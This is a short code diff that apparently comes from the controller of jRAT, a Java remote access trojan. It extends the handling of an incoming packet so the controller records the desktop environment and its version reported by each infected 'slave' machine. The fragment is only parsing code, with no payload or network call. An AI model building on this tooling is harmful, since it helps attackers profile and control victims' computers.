@@ -6,6 +6,7 @@ import se.jrat.client.Slave;
 
 import com.redpois0n.oslib.AbstractOperatingSystem;
 import com.redpois0n.oslib.Arch;
+import com.redpois0n.oslib.DesktopEnvironment;
 import com.redpois0n.oslib.OperatingSystem;
 import com.redpois0n.oslib.UnixOperatingSystem;
 import com.redpois0n.oslib.UnknownOperatingSystem;
@@ -26,8 +27,16 @@ public class Packet16InitOperatingSystem extends AbstractIncomingPacket {
 		String name = slave.readLine();
 		String details = slave.readLine();
 		String sarch = slave.readLine();
+		String sde = slave.readLine();
+		String deversion = null;
+		
+		if (dis.readBoolean()) {
+			deversion = slave.readLine();
+		}
 		
 		Arch arch = Arch.getArch(sarch);
+		DesktopEnvironment de = DesktopEnvironment.getFromString(sde);
+		de.setVersion(deversion);
 		
 		OperatingSystem type = OperatingSystem.getOperatingSystem(name);
 		
@@ -79,6 +88,8 @@ public class Packet16InitOperatingSystem extends AbstractIncomingPacket {
 			UnixOperatingSystem uos = (UnixOperatingSystem) os;
 			uos.setDetailed(details);
 		}
+		
+		os.setDesktopEnvironment(de);
 		
 		slave.setOperatingSystem(os);
 	}
